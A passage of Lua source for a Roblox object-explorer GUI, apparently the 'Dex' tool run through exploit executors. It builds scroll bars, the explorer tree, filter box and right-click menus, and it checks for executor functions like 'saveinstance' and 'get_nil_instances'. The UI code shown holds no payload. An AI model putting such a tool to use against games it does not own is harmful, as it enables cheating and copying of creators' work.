							Name = "ScrollThumb";
							AutoButtonColor = false;
							Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
							BackgroundColor3 = GuiColor.Button;
							BorderColor3 = GuiColor.Border;
							--BorderSizePixel = 0;
						});
					});
				})

				local graphicTemplate = Create('Frame',{
					Name="Graphic";
					BorderSizePixel = 0;
					BackgroundColor3 = GuiColor.Border;
				})
				local graphicSize = GUI_SIZE/2

				local ScrollDownFrame = ScrollFrame.ScrollDown
				local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
				ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollDownGraphic.Parent = ScrollDownFrame
				local ScrollUpFrame = ScrollFrame.ScrollUp
				local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
				ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollUpGraphic.Parent = ScrollUpFrame
				local ScrollBarFrame = ScrollFrame.ScrollBar
				local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
				do
					local size = GUI_SIZE*3/8
					local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
					Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
					Decal.Parent = ScrollThumbFrame
				end

				local Class = setmetatable({
					GUI = ScrollFrame;
					ScrollIndex = 0;
					VisibleSpace = 0;
					TotalSpace = 0;
					PageIncrement = 1;
				},mt)

				local UpdateScrollThumb
				if horizontal then
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,GUI_SIZE)
						if ScrollThumbFrame.AbsoluteSize.x < GUI_SIZE then
							ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.x
						ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
					end
				else
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,Class.VisibleSpace/Class.TotalSpace,0)
						if ScrollThumbFrame.AbsoluteSize.y < GUI_SIZE then
							ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.y
						ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
					end
				end

				local lastDown
				local lastUp
				local scrollStyle = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0}
				local scrollStyle_ds = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0.7}

				local function Update()
					local t = Class.TotalSpace
					local v = Class.VisibleSpace
					local s = Class.ScrollIndex
					if v <= t then
						if s > 0 then
							if s + v > t then
								Class.ScrollIndex = t - v
							end
						else
							Class.ScrollIndex = 0
						end
					else
						Class.ScrollIndex = 0
					end

					if Class.UpdateCallback then
						if Class.UpdateCallback(Class) == false then
							return
						end
					end

					local down = Class:CanScrollDown()
					local up = Class:CanScrollUp()
					if down ~= lastDown then
						lastDown = down
						ScrollDownFrame.Active = down
						ScrollDownFrame.AutoButtonColor = down
						local children = ScrollDownGraphic:GetChildren()
						local style = down and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					if up ~= lastUp then
						lastUp = up
						ScrollUpFrame.Active = up
						ScrollUpFrame.AutoButtonColor = up
						local children = ScrollUpGraphic:GetChildren()
						local style = up and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					ScrollThumbFrame.Visible = down or up
					UpdateScrollThumb()
				end
				Class.Update = Update

				SetZIndexOnChanged(ScrollFrame)

				local MouseDrag = Create('ImageButton',{
					Name = "MouseDrag";
					Position = UDim2.new(-0.25,0,-0.25,0);
					Size = UDim2.new(1.5,0,1.5,0);
					Transparency = 1;
					AutoButtonColor = false;
					Active = true;
					ZIndex = 10;
				})

				local scrollEventID = 0
				ScrollDownFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollDownFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollDown()
					wait(0.2) -- delay before auto scroll
					while scrollEventID == current do
						Class:ScrollDown()
						if not Class:CanScrollDown() then break end
						wait()
					end
				end)

				ScrollDownFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				ScrollUpFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollUpFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollUp()
					wait(0.2)
					while scrollEventID == current do
						Class:ScrollUp()
						if not Class:CanScrollUp() then break end
						wait()
					end
				end)

				ScrollUpFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				if horizontal then
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if x > ScrollThumbFrame.AbsolutePosition.x then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x > ScrollThumbFrame.AbsolutePosition.x then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				else
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if y > ScrollThumbFrame.AbsolutePosition.y then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y > ScrollThumbFrame.AbsolutePosition.y then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				end

				if horizontal then
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
							local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
							local bar_abs_one = bar_abs_pos + bar_drag
							x = x - mouse_offset
							x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
							x = x - bar_abs_pos
							Class:SetScrollPercent(x/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				else
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
							local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
							local bar_abs_one = bar_abs_pos + bar_drag
							y = y - mouse_offset
							y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
							y = y - bar_abs_pos
							Class:SetScrollPercent(y/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				end

				function Class:Destroy()
					ScrollFrame:Destroy()
					MouseDrag:Destroy()
					for k in pairs(Class) do
						Class[k] = nil
					end
					setmetatable(Class,nil)
				end

				Update()

				return Class
			end
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- Explorer panel

		local explorerPanel = D_E_X.ExplorerPanel
		Create(explorerPanel,{
			BackgroundColor3 = GuiColor.Field;
			BorderColor3 = GuiColor.Border;
			Active = true;
		})

		local SettingsRemote = explorerPanel.Parent:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")
		local GetApiRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetApi")
		local GetAwaitRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetAwaiting")
		local bindSetAwaiting = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("SetAwaiting")

		local SaveInstanceWindow = explorerPanel.Parent:WaitForChild("SaveInstance")
		local ConfirmationWindow = explorerPanel.Parent:WaitForChild("Confirmation")
		local CautionWindow = explorerPanel.Parent:WaitForChild("Caution")
		local TableCautionWindow = explorerPanel.Parent:WaitForChild("TableCaution")

		local RemoteWindow = explorerPanel.Parent:WaitForChild("CallRemote")

		local ScriptEditor = explorerPanel.Parent:WaitForChild("ScriptEditor")
		local ScriptEditorEvent = ScriptEditor:WaitForChild("OpenScript")

		local CurrentSaveInstanceWindow
		local CurrentRemoteWindow

		local lastSelectedNode

		local DexStorage
		local DexStorageMain
		local DexStorageEnabled

		if saveinstance then DexStorageEnabled = true end

		if DexStorageEnabled then
			DexStorage = Instance.new("Folder")
			DexStorage.Name = "Dex"
			DexStorageMain = Instance.new("Folder",DexStorage)
			DexStorageMain.Name = "DexStorage"
		end

		local NilStorage
		local NilStorageMain
		local NilStorageEnabled

		if get_nil_instances and IfThisFunctionWasStableEnough then NilStorageEnabled = true end

		if NilStorageEnabled then
			NilStorage = Instance.new("Folder")
			NilStorage.Name = "Dex Internal Storage"
			NilStorageMain = Instance.new("Folder",NilStorage)
			NilStorageMain.Name = "Nil Instances"
		end

		local listFrame = Create('Frame',{
			Name = "List";
			BackgroundTransparency = 1;
			ClipsDescendants = true;
			Position = UDim2.new(0,0,0,HEADER_SIZE);
			Size = UDim2.new(1,-GUI_SIZE,1,-HEADER_SIZE);
			Parent = explorerPanel;
		})

		local scrollBar = ScrollBar(false)
		scrollBar.PageIncrement = 1
		Create(scrollBar.GUI,{
			Position = UDim2.new(1,-GUI_SIZE,0,HEADER_SIZE);
			Size = UDim2.new(0,GUI_SIZE,1,-HEADER_SIZE);
			Parent = explorerPanel;
		})

		local scrollBarH = ScrollBar(true)
		scrollBarH.PageIncrement = GUI_SIZE
		Create(scrollBarH.GUI,{
			Position = UDim2.new(0,0,1,-GUI_SIZE);
			Size = UDim2.new(1,-GUI_SIZE,0,GUI_SIZE);
			Visible = false;
			Parent = explorerPanel;
		})

		local headerFrame = Create('Frame',{
			Name = "Header";
			BackgroundColor3 = GuiColor.Background;
			BorderColor3 = GuiColor.Border;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,0,0,HEADER_SIZE);
			Parent = explorerPanel;
			Create('TextLabel',{
				Text = "Explorer";
				BackgroundTransparency = 1;
				TextColor3 = GuiColor.Text;
				TextXAlignment = 'Left';
				Font = FONT;
				FontSize = FONT_SIZE;
				Position = UDim2.new(0,4,0,0);
				Size = UDim2.new(1,-4,0.5,0);
			});
		})

		local explorerFilter = 	Create('TextBox',{
			Text = "Filter Workspace";
			BackgroundTransparency = 0.8;
			TextColor3 = GuiColor.Text;
			TextXAlignment = 'Left';
			Font = FONT;
			FontSize = FONT_SIZE;
			Position = UDim2.new(0,4,0.5,0);
			Size = UDim2.new(1,-8,0.5,-2);
		});
		explorerFilter.Parent = headerFrame

		SetZIndexOnChanged(explorerPanel)

		local function CreateColor3(r, g, b) return Color3.new(r/255,g/255,b/255) end

		local Styles = {
			Font = Enum.Font.Arial;
			Margin = 5;
			Black = CreateColor3(0,0,0);
			White = CreateColor3(255,255,255);
		}

		local DropDown = {
			Font = Styles.Font;
			FontSize = Enum.FontSize.Size14;
			TextColor = CreateColor3(0,0,0);
			TextColorOver = Styles.White;
			TextXAlignment = Enum.TextXAlignment.Left;
			Height = 20;
			BackColor = Styles.White;
			BackColorOver = CreateColor3(86,125,188);
			BorderColor = CreateColor3(216,216,216);
			BorderSizePixel = 2;
			ArrowColor = CreateColor3(160,160,160);
			ArrowColorOver = Styles.Black;
		}

		local Row = {
			Font = Styles.Font;
			FontSize = Enum.FontSize.Size14;
			TextXAlignment = Enum.TextXAlignment.Left;
			TextColor = Styles.Black;
			TextColorOver = Styles.White;
			TextLockedColor = CreateColor3(120,120,120);
			Height = 24;
			BorderColor = CreateColor3(216,216,216);
			BackgroundColor = Styles.White;
			BackgroundColorAlternate = CreateColor3(246,246,246);
			BackgroundColorMouseover = CreateColor3(211,224,244);
			TitleMarginLeft = 15;
		}

		local currentRightClickMenu
		local CurrentInsertObjectWindow
		local CurrentFunctionCallerWindow

		local RbxApi

		function ClassCanCreate(IName)
			local success,err = pcall(function() Instance.new(IName) end)
			if err then
				return false
			else
				return true
			end
		end

		function GetClasses()
			if RbxApi == nil then return {} end
			local classTable = {}
			for i,v in pairs(RbxApi.Classes) do
				if ClassCanCreate(v.Name) then
					table.insert(classTable,v.Name)
				end
			end
			return classTable
		end

		local function sortAlphabetic(t, property)
			table.sort(t, 
				function(x,y) return x[property] < y[property]
				end)
		end

		local function FunctionIsHidden(functionData)
			local tags = functionData["tags"]
			for _,name in pairs(tags) do
				if name == "deprecated"
					or name == "hidden"
					or name == "writeonly" then
					return true
				end
			end
			return false
		end

		local function GetAllFunctions(className)
			local class = RbxApi.Classes[className]
			local functions = {}

			if not class then return functions end

			while class do
				if class.Name == "Instance" then break end
				for _,nextFunction in pairs(class.Functions) do
					if not FunctionIsHidden(nextFunction) then
						table.insert(functions, nextFunction)
					end
				end
				class = RbxApi.Classes[class.Superclass]
			end

			sortAlphabetic(functions, "Name")

			return functions
		end

		function GetFunctions()
			if RbxApi == nil then return {} end
			local List = SelectionVar():Get()

			if #List == 0 then return end

			local MyObject = List[1]

			local functionTable = {}
			for i,v in pairs(GetAllFunctions(MyObject.ClassName)) do
				table.insert(functionTable,v)
			end
			return functionTable
		end

		function CreateInsertObjectMenu(choices, currentChoice, readOnly, onClick)
			local mouse = game.Players.LocalPlayer:GetMouse()
			local totalSize = explorerPanel.Parent.AbsoluteSize.y
			if #choices == 0 then return end

			table.sort(choices, function(a,b) return a < b end)

			local frame = Instance.new("Frame")	
			frame.Name = "InsertObject"
			frame.Size = UDim2.new(0, 200, 1, 0)
			frame.BackgroundTransparency = 1
			frame.Active = true

			local menu = nil
			local arrow = nil
			local expanded = false
			local margin = DropDown.BorderSizePixel;

	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]

			local function hideMenu()
				expanded = false
				--showArrow(DropDown.ArrowColor)
				if frame then 
					--frame:Destroy()
					CurrentInsertObjectWindow.Visible = false
				end
			end

			local function showMenu()
				expanded = true
				menu = Instance.new("ScrollingFrame")
				menu.Size = UDim2.new(0,200,1,0)
				menu.CanvasSize = UDim2.new(0, 200, 0, #choices * DropDown.Height)
				menu.Position = UDim2.new(0, margin, 0, 0)
				menu.BackgroundTransparency = 0
				menu.BackgroundColor3 = DropDown.BackColor
				menu.BorderColor3 = DropDown.BorderColor
				menu.BorderSizePixel = DropDown.BorderSizePixel
				menu.TopImage = "rbxasset://textures/blackBkg_square.png"
				menu.MidImage = "rbxasset://textures/blackBkg_square.png"
				menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
				menu.Active = true
				menu.ZIndex = 5
				menu.Parent = frame

				--local parentFrameHeight = script.Parent.List.Size.Y.Offset
				--local rowHeight = mouse.Y
				--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
				--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
				--end

				local function choice(name)
					onClick(name)
					hideMenu()
				end

				for i,name in pairs(choices) do
					local option = CreateRightClickMenuItem(name, function()
						choice(name)
					end,1)
					option.Size = UDim2.new(1, 0, 0, 20)
					option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
					option.ZIndex = menu.ZIndex
					option.Parent = menu
				end
			end


			showMenu()


			return frame
		end

		function CreateFunctionCallerMenu(choices, currentChoice, readOnly, onClick)
			local mouse = game.Players.LocalPlayer:GetMouse()
			local totalSize = explorerPanel.Parent.AbsoluteSize.y
			if #choices == 0 then return end

			table.sort(choices, function(a,b) return a.Name < b.Name end)

			local frame = Instance.new("Frame")	
			frame.Name = "InsertObject"
			frame.Size = UDim2.new(0, 200, 1, 0)
			frame.BackgroundTransparency = 1
			frame.Active = true

			local menu = nil
			local arrow = nil
			local expanded = false
			local margin = DropDown.BorderSizePixel;

			local function hideMenu()
				expanded = false
				--showArrow(DropDown.ArrowColor)
				if frame then 
					--frame:Destroy()
					CurrentInsertObjectWindow.Visible = false
				end
			end

			local function showMenu()
				expanded = true
				menu = Instance.new("ScrollingFrame")
				menu.Size = UDim2.new(0,300,1,0)
				menu.CanvasSize = UDim2.new(0, 300, 0, #choices * DropDown.Height)
				menu.Position = UDim2.new(0, margin, 0, 0)
				menu.BackgroundTransparency = 0
				menu.BackgroundColor3 = DropDown.BackColor
				menu.BorderColor3 = DropDown.BorderColor
				menu.BorderSizePixel = DropDown.BorderSizePixel
				menu.TopImage = "rbxasset://textures/blackBkg_square.png"
				menu.MidImage = "rbxasset://textures/blackBkg_square.png"
				menu.BottomImage = "rbxasset://textures/blackBkg_square.png"
				menu.Active = true
				menu.ZIndex = 5
				menu.Parent = frame

				--local parentFrameHeight = script.Parent.List.Size.Y.Offset
				--local rowHeight = mouse.Y
				--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
				--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
				--end

				local function GetParameters(functionData)
					local paraString = ""
					paraString = paraString.."("
					for i,v in pairs(functionData.Arguments) do
						paraString = paraString..v.Type.." "..v.Name
						if i < #functionData.Arguments then
							paraString = paraString..", "
						end
					end
					paraString = paraString..")"
					return paraString
				end

				local function choice(name)
					onClick(name)
					hideMenu()
				end

				for i,name in pairs(choices) do
					local option = CreateRightClickMenuItem(name.ReturnType.." "..name.Name..GetParameters(name), function()
						choice(name)
					end,2)
					option.Size = UDim2.new(1, 0, 0, 20)
					option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
					option.ZIndex = menu.ZIndex
					option.Parent = menu
				end
			end


			showMenu()


			return frame
		end

		function CreateInsertObject()
			if not CurrentInsertObjectWindow then return end
			CurrentInsertObjectWindow.Visible = true
			if currentRightClickMenu and CurrentInsertObjectWindow.Visible then
				CurrentInsertObjectWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset-2,0,0)
			end
			if CurrentInsertObjectWindow.Visible then
				CurrentInsertObjectWindow.Parent = explorerPanel.Parent
			end
		end

		function CreateFunctionCaller()
			if CurrentFunctionCallerWindow then
				CurrentFunctionCallerWindow:Destroy()
				CurrentFunctionCallerWindow = nil
			end
			CurrentFunctionCallerWindow = CreateFunctionCallerMenu(
				GetFunctions(),
				"",
				false,
				function(option)
					CurrentFunctionCallerWindow:Destroy()
					CurrentFunctionCallerWindow = nil
					local list = SelectionVar():Get()
					for i = 1,#list do
						pcall(function() Instance.new(option,list[i]) end)
					end
					print(option.Name .. " selected to be called. Function caller being added soon, please wait!")
					--CallFunction()
					DestroyRightClick()
				end
			)
			if currentRightClickMenu and CurrentFunctionCallerWindow then
				CurrentFunctionCallerWindow.Position = UDim2.new(0,currentRightClickMenu.Position.X.Offset-currentRightClickMenu.Size.X.Offset*1.5-2,0,0)
			end
			if CurrentFunctionCallerWindow then
				CurrentFunctionCallerWindow.Parent = explorerPanel.Parent
			end
		end

		function CreateRightClickMenuItem(text, onClick, insObj)
			local button = Instance.new("TextButton")
			button.Font = DropDown.Font
			button.FontSize = DropDown.FontSize
			button.TextColor3 = DropDown.TextColor
			button.TextXAlignment = DropDown.TextXAlignment
			button.BackgroundColor3 = DropDown.BackColor
			button.AutoButtonColor = false
			button.BorderSizePixel = 0
			button.Active = true
			button.Text = text

			if insObj == 1 then
				local newIcon = Icon(nil,ExplorerIndex[text] or 0)
				newIcon.Position = UDim2.new(0,0,0,2)
				newIcon.Size = UDim2.new(0,16,0,16)
				newIcon.IconMap.ZIndex = 5
				newIcon.Parent = button
				button.Text = "\t\t"..button.Text
			elseif insObj == 2 then
				button.FontSize = Enum.FontSize.Size11
			end

			button.MouseEnter:connect(function()
				button.TextColor3 = DropDown.TextColorOver
				button.BackgroundColor3 = DropDown.BackColorOver
				if not insObj and CurrentInsertObjectWindow then
					if CurrentInsertObjectWindow.Visible == false and button.Text == "Insert Object" then
						CreateInsertObject()
					elseif CurrentInsertObjectWindow.Visible and button.Text ~= "Insert Object" then
						CurrentInsertObjectWindow.Visible = false
					end
				end
				if not insObj then
					if CurrentFunctionCallerWindow and button.Text ~= "Call Function" then
						CurrentFunctionCallerWindow:Destroy()
						CurrentFunctionCallerWindow = nil
					elseif button.Text == "Call Function" then
						CreateFunctionCaller()
					end
				end
			end)
			button.MouseLeave:connect(function()
				button.TextColor3 = DropDown.TextColor
				button.BackgroundColor3 = DropDown.BackColor
			end)
			button.MouseButton1Click:connect(function()
				button.TextColor3 = DropDown.TextColor
				button.BackgroundColor3 = DropDown.BackColor
				onClick(text)
			end)	
			return button
		end

		function CreateRightClickMenu(choices, currentChoice, readOnly, onClick)
			local mouse = game.Players.LocalPlayer:GetMouse()

			local frame = Instance.new("Frame")	
			frame.Name = "DropDown"
			frame.Size = UDim2.new(0, 200, 1, 0)
			frame.BackgroundTransparency = 1
			frame.Active = true

			local menu = nil
			local arrow = nil
			local expanded = false
			local margin = DropDown.BorderSizePixel;

	--[[
	local button = Instance.new("TextButton")
	button.Font = Row.Font
	button.FontSize = Row.FontSize
	button.TextXAlignment = Row.TextXAlignment
	button.BackgroundTransparency = 1
	button.TextColor3 = Row.TextColor
	if readOnly then
		button.TextColor3 = Row.TextLockedColor
	end
	button.Text = currentChoice
	button.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
	button.Position = UDim2.new(0, Styles.Margin, 0, 0)
	button.Parent = frame
	--]]

			local function hideMenu()
				expanded = false
				--showArrow(DropDown.ArrowColor)
				if frame then 
					frame:Destroy()
					DestroyRightClick()
				end
			end

			local function showMenu()
				expanded = true
				menu = Instance.new("Frame")
				menu.Size = UDim2.new(0, 200, 0, #choices * DropDown.Height)
				menu.Position = UDim2.new(0, margin, 0, 5)
				menu.BackgroundTransparency = 0
				menu.BackgroundColor3 = DropDown.BackColor
				menu.BorderColor3 = DropDown.BorderColor
				menu.BorderSizePixel = DropDown.BorderSizePixel
				menu.Active = true
				menu.ZIndex = 5
				menu.Parent = frame

				--local parentFrameHeight = script.Parent.List.Size.Y.Offset
				--local rowHeight = mouse.Y
				--if (rowHeight + menu.Size.Y.Offset) > parentFrameHeight then
				--	menu.Position = UDim2.new(0, margin, 0, -1 * (#choices * DropDown.Height) - margin)
				--end

				local function choice(name)
					onClick(name)
					hideMenu()
				end

				for i,name in pairs(choices) do
					local option = CreateRightClickMenuItem(name, function()
						choice(name)
					end)
					option.Size = UDim2.new(1, 0, 0, 20)
					option.Position = UDim2.new(0, 0, 0, (i - 1) * DropDown.Height)
					option.ZIndex = menu.ZIndex
					option.Parent = menu
				end
			end


			showMenu()


			return frame
		end

		function checkMouseInGui(gui)
			if gui == nil then return false end
			local plrMouse = game.Players.LocalPlayer:GetMouse()
			local guiPosition = gui.AbsolutePosition
			local guiSize = gui.AbsoluteSize	

			if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
				return true
			else
				return false
			end
		end

		local clipboard = {}
		local function delete(o)
			o.Parent = nil
		end

		local getTextWidth do
			local text = Create('TextLabel',{
				Name = "TextWidth";
				TextXAlignment = 'Left';
				TextYAlignment = 'Center';
				Font = FONT;
				FontSize = FONT_SIZE;
				Text = "";
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(1,0,1,0);
				Visible = false;
				Parent = explorerPanel;
			})
			function getTextWidth(s)
				text.Text = s
				return text.TextBounds.x
			end
		end

		local nameScanned = false
		-- Holds the game tree converted to a list.
		local TreeList = {}
		-- Matches objects to their tree node representation.
		local NodeLookup = {}

		local nodeWidth = 0

		local QuickButtons = {}

		function filteringWorkspace()
			if explorerFilter.Text ~= "" and explorerFilter.Text ~= "Filter Workspace" then
				return true
			end
			return false
		end

		function lookForAName(obj,name)
			for i,v in pairs(obj:GetChildren()) do
				if string.find(string.lower(v.Name),string.lower(name)) then nameScanned = true end
				lookForAName(v,name)
			end
		end

		function scanName(obj)
			nameScanned = false
			if string.find(string.lower(obj.Name),string.lower(explorerFilter.Text)) then
				nameScanned = true
			else
				lookForAName(obj,explorerFilter.Text)
			end
			return nameScanned
		end

		function updateActions()
			for i,v in pairs(QuickButtons) do
				if v.Cond() then
					v.Toggle(true)
				else
					v.Toggle(false)
				end
			end
		end

		local updateList,rawUpdateList,updateScroll,rawUpdateSize do
			local function r(t)
				for i = 1,#t do
					if not filteringWorkspace() or scanName(t[i].Object) then
						TreeList[#TreeList+1] = t[i]

						local w = (t[i].Depth)*(2+ENTRY_PADDING+GUI_SIZE) + 2 + ENTRY_SIZE + 4 + getTextWidth(t[i].Object.Name) + 4
						if w > nodeWidth then
							nodeWidth = w
						end
						if t[i].Expanded or filteringWorkspace() then
							r(t[i])
						end
					end
				end
			end

			function rawUpdateSize()
				scrollBarH.TotalSpace = nodeWidth
				scrollBarH.VisibleSpace = listFrame.AbsoluteSize.x
				scrollBarH:Update()
				local visible = scrollBarH:CanScrollDown() or scrollBarH:CanScrollUp()
				scrollBarH.GUI.Visible = visible

				listFrame.Size = UDim2.new(1,-GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)

				scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
				scrollBar.GUI.Size = UDim2.new(0,GUI_SIZE,1,-GUI_SIZE*(visible and 1 or 0) - HEADER_SIZE)

				scrollBar.TotalSpace = #TreeList+1
				scrollBar:Update()
			end

			function rawUpdateList()
				-- Clear then repopulate the entire list. It appears to be fast enough.
				TreeList = {}
				nodeWidth = 0
				r(NodeLookup[workspace.Parent])
				if DexStorageEnabled then
					r(NodeLookup[DexStorage])
				end
				if NilStorageEnabled then
					r(NodeLookup[NilStorage])
				end
				rawUpdateSize()
				updateActions()
			end

			-- Adding or removing large models will cause many updates to occur. We
			-- can reduce the number of updates by creating a delay, then dropping any
			-- updates that occur during the delay.
			local updatingList = false
			function updateList()
				if updatingList then return end
				updatingList = true
				wait(0.25)
				updatingList = false
				rawUpdateList()
			end

			local updatingScroll = false
			function updateScroll()
				if updatingScroll then return end
				updatingScroll = true
				wait(0.25)
				updatingScroll = false
				scrollBar:Update()
			end
		end

		local Selection do
			local bindGetSelection = explorerPanel:FindFirstChild("GetSelection")
			if not bindGetSelection then
				bindGetSelection = Create('BindableFunction',{Name = "GetSelection"})
				bindGetSelection.Parent = explorerPanel
			end

			local bindSetSelection = explorerPanel:FindFirstChild("SetSelection")
			if not bindSetSelection then
				bindSetSelection = Create('BindableFunction',{Name = "SetSelection"})
				bindSetSelection.Parent = explorerPanel
			end

			local bindSelectionChanged = explorerPanel:FindFirstChild("SelectionChanged")
			if not bindSelectionChanged then
				bindSelectionChanged = Create('BindableEvent',{Name = "SelectionChanged"})
				bindSelectionChanged.Parent = explorerPanel
			end

			local SelectionList = {}
			local SelectionSet = {}
			local Updates = true
			Selection = {
				Selected = SelectionSet;
				List = SelectionList;
			}

			local function addObject(object)
				-- list update
				local lupdate = false
				-- scroll update
				local supdate = false

